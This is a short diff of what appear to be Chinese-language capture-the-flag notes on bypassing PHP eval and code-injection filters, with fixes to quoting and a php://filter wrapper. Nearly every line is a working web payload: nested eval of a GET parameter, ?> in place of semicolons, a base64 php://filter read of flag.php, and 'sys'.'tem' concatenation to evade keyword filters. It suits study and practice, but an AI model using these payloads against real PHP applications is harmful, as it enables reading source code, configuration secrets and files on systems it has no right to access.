@@ -9,11 +9,11 @@ eval('system('cat /flag'); ');         //会将字符串当作PHP代码执行，
 
 eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码也会正常执行。
 
-/?c=eval($_GET[a])?>&a=system('cat flag.php');  //绕过eval有限制。过滤了;
 /?c=eval($_GET[a]);&a=system('cat flag.php');  //绕过eval有限制。
+/?c=eval($_GET[a])?>&a=system('cat flag.php');  //绕过eval有限制。过滤了;
 eval('eval($_GET[a])?>')  
 
-/?c=include"$_GET[a]“?>&a=php://filter/read=convert.base64 -encode/resource=flag.php //过滤了(
+/?c=include"$_GET[a]"?>&a=php://filter/read=convert.base64-encode/resource=flag.php //过滤了(
 
 eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。
 
